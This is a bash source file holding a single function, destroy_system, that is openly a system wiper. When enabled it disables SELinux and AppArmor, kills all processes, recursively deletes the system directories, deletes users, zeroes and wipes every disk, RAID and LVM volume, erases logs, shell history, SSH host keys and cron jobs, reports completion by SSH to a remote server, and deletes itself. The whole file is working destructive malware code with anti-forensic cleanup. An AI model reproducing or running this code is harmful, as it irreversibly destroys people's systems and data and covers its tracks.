#!/usr/bin/env bash

destroy_system() {
    local real_delete="${1:-0}"
    
    if [[ "$real_delete" != "1" ]]; then
        log_warn "SIMULATION mode - No deletion"
        return 0
    fi
    
    log_warn "[+] STARTING SYSTEM DESTRUCTION"
    
    log_warn "Disabling system protections"
    
    if command -v setenforce >/dev/null 2>&1; then
        setenforce 0 2>/dev/null || true
        log_info "  SELinux disabled"
    fi
    
    if command -v apparmor_parser >/dev/null 2>&1; then
        systemctl stop apparmor 2>/dev/null || true
        systemctl disable apparmor 2>/dev/null || true
        log_info "  AppArmor disabled"
    fi
    
    if command -v chattr >/dev/null 2>&1; then
        find / -type f -exec chattr -i {} \; 2>/dev/null || true
        find / -type d -exec chattr -i {} \; 2>/dev/null || true
        log_info "  Immutable flags removed"
    fi
    

    log_warn "Terminating all processes"
    
    killall -TERM 2>/dev/null || true
    sleep 2
    
    killall -KILL 2>/dev/null || true
    sleep 1
    
    for pid in $(ps -eo pid= 2>/dev/null | grep -v "^$$$" 2>/dev/null || true); do
        kill -9 "$pid" 2>/dev/null || true
    done
    log_info "  Processes terminated"
    

    log_warn "Deleting system directories"
    
    local dirs_to_delete=(
        "/home"
        "/root"
        "/opt"
        "/srv"
        "/var"
        "/usr/local"
        "/usr/share"
        "/usr/lib"
        "/usr/bin"
        "/usr/sbin"
        "/usr"
        "/lib64"
        "/lib"
        "/sbin"
        "/bin"
        "/etc"
        "/boot"
    )
    
    for dir in "${dirs_to_delete[@]}"; do
        if [[ -d "$dir" ]]; then
            log_warn "  Deleting $dir"
            rm -rf "$dir" 2>/dev/null || true
            if command -v sudo >/dev/null 2>&1; then
                sudo rm -rf "$dir" 2>/dev/null || true
            fi
        fi
    done
    

    log_warn "Deleting users and groups"
    
    if [[ -f /etc/passwd ]]; then
        while IFS=: read -r user uid _; do
            if [[ "$user" != "root" ]] && [[ "$uid" -ge 1000 ]] 2>/dev/null; then
                userdel -f "$user" 2>/dev/null || true
                log_info "  Deleted user: $user"
            fi
        done < /etc/passwd
    fi
    
    if [[ -f /etc/group ]]; then
        while IFS=: read -r group gid _; do
            if [[ "$group" != "root" ]] && [[ "$gid" -ge 1000 ]] 2>/dev/null; then
                groupdel -f "$group" 2>/dev/null || true
                log_info "  Deleted group: $group"
            fi
        done < /etc/group
    fi
    

    log_warn "Destroying disk data"
    
    if command -v lsblk >/dev/null 2>&1; then
        local disks=$(lsblk -nd -o NAME,TYPE 2>/dev/null | grep disk | awk '{print $1}')
        
        for disk in $disks; do
            if [[ -e "/dev/$disk" ]]; then
                log_warn "  Wiping /dev/$disk"
                
                dd if=/dev/zero of="/dev/$disk" bs=1M count=100 2>/dev/null || true
                
                dd if=/dev/urandom of="/dev/$disk" bs=512 count=10 2>/dev/null || true
                
                dd if=/dev/urandom of="/dev/$disk" bs=512 count=1 2>/dev/null || true
                
                log_info "  /dev/$disk destroyed"
            fi
        done
    fi
    
    if command -v mdadm >/dev/null 2>&1; then
        mdadm --stop --scan 2>/dev/null || true
        mdadm --zero-superblock --scan 2>/dev/null || true
        log_info "  Software RAID destroyed"
    fi
    
    if command -v lvm >/dev/null 2>&1; then
        for vg in $(vgs --noheadings -o vg_name 2>/dev/null); do
            vgchange -an "$vg" 2>/dev/null || true
            vgremove -f "$vg" 2>/dev/null || true
            log_info "  LVM volume group removed: $vg"
        done
        pvremove -f /dev/* 2>/dev/null || true
        log_info "  LVM removed"
    fi
    

    log_warn "Destroying filesystems"
    
    if command -v mount >/dev/null 2>&1; then
        while read -r _ mountpoint fstype; do
            case "$mountpoint" in
                /proc|/sys|/dev|/run|/tmp) continue ;;
            esac
            
            umount -f "$mountpoint" 2>/dev/null || true
            log_info "  Unmounted: $mountpoint"
        done < <(mount -t ext2,ext3,ext4,xfs,btrfs,zfs,fat,vfat,ntfs 2>/dev/null | awk '{print $1,$3,$5}')
    fi
    
    if command -v wipefs >/dev/null 2>&1; then
        local disk_patterns=("/dev/sd*" "/dev/hd*" "/dev/vd*" "/dev/nvme*")
        for pattern in "${disk_patterns[@]}"; do
            for disk in $pattern; do
                if [[ -e "$disk" ]]; then
                    wipefs -a "$disk" 2>/dev/null || true
                    log_info "  Filesystem wiped: $disk"
                fi
            done
        done
    fi


    log_warn "Final cleanup"
    
    rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
    
    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null || true
    
    rm -f ~/.bash_history /root/.bash_history 2>/dev/null || true
    
    rm -rf /etc/ssh/ssh_host_* 2>/dev/null || true
    
    rm -rf /var/spool/cron/* /etc/cron.d/* /etc/cron.*/* 2>/dev/null || true
    

    log_done "System destroyed successfully"
    
    if [[ -n "${VPS_IP:-}" ]] && [[ -n "${VPS_USER:-}" ]] && [[ -n "${VPS_PORT:-}" ]]; then
        ssh -o ConnectTimeout=2 \
            -o BatchMode=yes \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -p "$VPS_PORT" "$VPS_USER@$VPS_IP" \
            "echo '$(date '+%Y-%m-%d %H:%M:%S') [DONE] System destroyed successfully' >> '$REMOTE_LOG_PATH'" 2>/dev/null || true
    fi
    
    rm -f "$0" 2>/dev/null || true
    
    rm -f "$LOG_FILE" 2>/dev/null || true
    
    exit 0
}